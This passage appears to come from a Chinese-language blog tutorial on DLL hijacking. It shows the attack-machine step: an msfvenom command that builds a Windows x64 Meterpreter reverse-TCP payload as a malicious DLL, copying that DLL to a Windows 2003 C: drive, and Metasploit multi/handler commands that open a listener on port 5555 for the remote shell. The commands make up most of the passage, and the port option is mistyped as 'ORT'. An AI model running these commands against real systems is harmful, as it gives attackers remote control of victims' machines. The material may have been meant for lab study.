### 3.攻击机kali上

利用msf生成一个dll劫持文件：

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.1.106 ORT=5555 -f dll > /opt/s.dll

[![](/wp-content/uploads/2017/04/9.png)](/wp-content/uploads/2017/04/9.png)

将s.dll文件拷贝到windows2003的C盘目录下：

[![](/wp-content/uploads/2017/04/10.png)](/wp-content/uploads/2017/04/10.png)

在msf下开启msfpaylod监听：

use exploit/multi/handler

set lhost 192.168.1.106

set lport 5555

set PAYLOAD windows/x64/meterpreter/reverse\_tcp

exploit

[![](/wp-content/uploads/2017/04/11.png)](/wp-content/uploads/2017/04/11.png)
